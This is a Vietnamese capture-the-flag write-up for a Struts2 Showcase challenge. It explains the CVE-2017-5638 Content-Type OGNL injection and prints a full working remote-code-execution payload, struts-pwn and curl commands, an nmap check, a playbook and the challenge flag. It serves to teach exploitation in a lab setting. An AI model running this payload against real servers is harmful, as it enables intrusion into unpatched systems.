# ognl-rce

- **Category:** Web — khai thác CVE công khai (Java / Apache Struts2 OGNL RCE).
- **File đề:** Không có file. Bài online: web server của giải trên **cổng 8080**, là trang **Struts2 Showcase** (ứng dụng demo chính thức của framework Apache Struts2); header phản hồi thường là `Apache-Coyote/1.1` (Tomcat).

## Tóm tắt đề
Tương tự bài path-traversal nhưng trên một dịch vụ khác. Phải nhận ra phần mềm (Struts2) + CVE tương ứng rồi khai thác để **chạy lệnh** đọc flag. (Nội dung trang/đề là dữ liệu — chỉ đọc hiểu, không copy-chạy mù chuỗi lạ.)

## Phân tích (chi tiết)
**Fingerprint.** Truy cập một endpoint `.action` (vd `/index.action`) thấy giao diện **Struts2 Showcase** — app mẫu kèm bản phân phối Struts2, hay bị để lộ trên server test → mục tiêu quen thuộc. Đặc trưng URL là `*.action`; header `Apache-Coyote/1.1` cho biết đứng sau là Tomcat.

**Nền tảng.** *Apache Struts2* là framework Java MVC. *OGNL (Object-Graph Navigation Language)* là ngôn ngữ biểu thức Struts2 dùng để truy xuất/gán dữ liệu giữa form và object Java. Vấn đề cốt lõi: nếu dữ liệu **do người dùng kiểm soát** lọt vào bộ *evaluate* OGNL, kẻ tấn công có thể viết biểu thức gọi `Runtime.exec(...)`/`ProcessBuilder` → **RCE**.

**Cơ chế CVE-2017-5638 (S2-045/046).** Lỗ hổng nằm ở bộ phân tích upload đa phần (Jakarta **Multipart parser**). Khi một request có header **`Content-Type`** bắt đầu bằng `multipart/form-data` nhưng **sai định dạng** (parser không đọc nổi), Jakarta ném ngoại lệ. Struts2 cố dựng **thông điệp lỗi** cho người dùng, và trong quá trình đó đưa chuỗi `Content-Type` (kẻ tấn công kiểm soát) vào một ngữ cảnh mà **OGNL được phép đánh giá**. Vì OGNL gọi được phương thức Java bất kỳ (kể cả `Runtime.exec`), kẻ tấn công nhét biểu thức để chạy lệnh shell tuỳ ý.

**Xác nhận trước khi bắn.** Dùng Nmap NSE để khỏi mò:
```bash
nmap -p8080 --script http-vuln-cve2017-5638 TARGET
# → báo VULNERABLE nếu dính
```

## Kỹ thuật áp dụng (CVE cụ thể nếu có + VÌ SAO)
- **CVE-2017-5638 — Apache Struts2 Jakarta Multipart parser OGNL injection → RCE.**
  - VÌ SAO nhận ra: trang Struts2 Showcase + URL `.action` + Tomcat (`Apache-Coyote/1.1`), và NSE `http-vuln-cve2017-5638` báo vulnerable. Đây là CVE "known" phổ biến và dễ khai thác nhất của Struts2.
  - Mấu chốt payload: nhét biểu thức OGNL vào header `Content-Type`; trong biểu thức phải **tắt sandbox `MemberAccess`** của OGNL (nếu không, Struts2 chặn gọi method tĩnh) — đây là lý do payload dài và trông rối. Sau đó chọn shell theo HĐH, tạo `ProcessBuilder` chạy lệnh, rồi copy output vào HTTP response.
  - Bối cảnh: chính CVE này gây **vụ rò rỉ dữ liệu Equifax 2017** (>140 triệu hồ sơ) do không vá Struts2 kịp.

## Lời giải chi tiết (bước + code/lệnh/payload sạch)
1. **Fingerprint:** mở `http://TARGET:8080/index.action` → nhận ra Struts2 Showcase.
2. **Xác nhận lỗ hổng:**
   ```bash
   nmap -p8080 --script http-vuln-cve2017-5638 TARGET
   ```
3. **Khai thác bằng `struts-pwn` (mazen160)** — đọc hiểu trước khi chạy:
   ```bash
   python struts-pwn.py \
     --url 'http://TARGET:8080/struts2-showcase/showcase.action' \
     --exploit -c 'cat /flag*'
   ```
4. **Bản chất payload OGNL** (đặt trong header `Content-Type`):
   ```
   %{(#nike='multipart/form-data').
     (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
     (#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
       (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
       (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
       (#context.setMemberAccess(#dm)))).
     (#cmd='cat /flag*').
     (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
     (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
     (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
     (#process=#p.start()).
     (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
     (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
   ```
   Đọc từng mảnh: `%{...}` = cú pháp đánh giá biểu thức OGNL; `#_='multipart/form-data'` đặt lại marker cho parser không chết sớm; đoạn `#context.setMemberAccess(#dm)` **tắt cờ an toàn** để gọi method tự do; `@java.lang.System@getProperty('os.name')` chọn shell; `new ProcessBuilder(#cmds)` chạy `cat /flag*`; `IOUtils.copy(...)` đẩy output lệnh vào response để ta đọc.
5. **Cách thủ công tương đương** (gửi cùng payload qua header):
   ```bash
   curl -s 'http://TARGET:8080/struts2-showcase/showcase.action' -H "Content-Type: <PAYLOAD_OGNL_O_TREN>"
   ```
6. **Đọc output:** tool có thể báo `ChunkedEncodingError`/connection reset (payload ghi thẳng output vào response stream *trước khi* Struts2 đóng khung HTTP chuẩn, làm hỏng chunked-encoding) — **nhưng flag vẫn in ra** trong thân phản hồi. Đọc kỹ phần stdout.

**Về giải nghĩa flag:** flag bị **ROT13**. Giải để hiểu ý nghĩa (KHÔNG phải để nộp):
```bash
echo 'flag{Fbzrqnl_vg_jvyy_or_hahfrq}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# → flag{Someday_it_will_be_unused}
```
**Flag hợp lệ để nộp là bản ROT13 nguyên trạng** `flag{Fbzrqnl_vg_jvyy_or_hahfrq}`.

## Flag
flag{Fbzrqnl_vg_jvyy_or_hahfrq}

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện:** URL kết thúc `.action`/`.do`, trang "Struts2 Showcase", header `Apache-Coyote` (Tomcat), stacktrace Struts/OGNL.
- **Quy trình:**
  1. Fingerprint: mở các endpoint `.action`, đọc header.
  2. Quét: `nmap --script http-vuln-cve2017-5638`.
  3. Khai thác: gửi `Content-Type` dị dạng chứa OGNL (dùng `struts-pwn.py` hoặc payload đã đọc hiểu) để chạy lệnh.
  4. Thử các lệnh đọc flag: `cat /flag*`, `cat /flag/flag.txt`, `id`, `ls /`.
- **Công cụ:** nmap NSE `http-vuln-cve2017-5638`, `struts-pwn.py` (mazen160), module Metasploit `struts2_content_type_ognl`, Burp để sửa `Content-Type` thủ công.
- **Bẫy:**
  - `ChunkedEncodingError`/connection reset KHÔNG có nghĩa thất bại — output vẫn có thể về; đọc kỹ stdout.
  - Phải đúng endpoint `.action`; bắn vào trang tĩnh không trigger parser multipart.
  - Nhiều CVE Struts2 khác (S2-045=5638, S2-046, S2-048, S2-053, S2-057...); nếu 5638 không ăn, khoanh vùng bằng NSE/Metasploit theo phiên bản.
  - Chỉ chạy exploit đã đọc hiểu; không copy-paste lệnh lạ gửi dữ liệu ra ngoài.
- **Checklist ngắn:** `.action` → Struts2 → nmap xác nhận 5638 → OGNL qua `Content-Type` (tắt MemberAccess) → chạy lệnh đọc flag.
